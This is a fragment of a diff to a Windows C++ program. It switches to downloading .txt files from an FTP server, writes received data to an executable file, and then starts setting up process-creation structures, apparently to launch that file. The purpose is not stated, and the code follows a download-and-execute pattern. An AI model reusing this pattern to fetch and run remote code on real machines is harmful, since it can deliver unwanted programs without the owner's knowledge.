@@ -75,9 +75,18 @@ int main()
 			cout << FileData.cFileName << endl;
 			if (has_suffix(FileData.cFileName, ".txt"))
 			{
-				string name = FileData.cFileName;
-				string file = "F:\\ftpserver\\" + name;
-				ifstream fin(file);
+				if (!FtpGetFile(hInternetConnect,
+								FileData.cFileName,
+								FileData.cFileName, 
+								FALSE,
+								FILE_ATTRIBUTE_NORMAL,
+								FTP_TRANSFER_TYPE_ASCII,
+								NULL))
+				{
+					cout << "FtpGetFile error. Error: " << GetLastError() << endl;
+					return -1;
+				}
+				ifstream fin(FileData.cFileName);
 				string line;
 				if (fin.is_open())
 				{
@@ -138,10 +147,6 @@ int main()
 							ofstream fout(exe);
 							fout << buffer;
 
-							/*ofstream outfile;
-							outfile.open(exe);
-							outfile << buffer;*/
-
 							while (bytesRead)
 							{
 								memset(buffer, 0, sizeof(buffer));
@@ -154,10 +159,8 @@ int main()
 									return -1;
 								}
 								fout << buffer;
-								//outfile << buffer;
 							}
 							fout.close();
-							//outfile.close();
 
 							PROCESS_INFORMATION pi;
 							STARTUPINFO si;
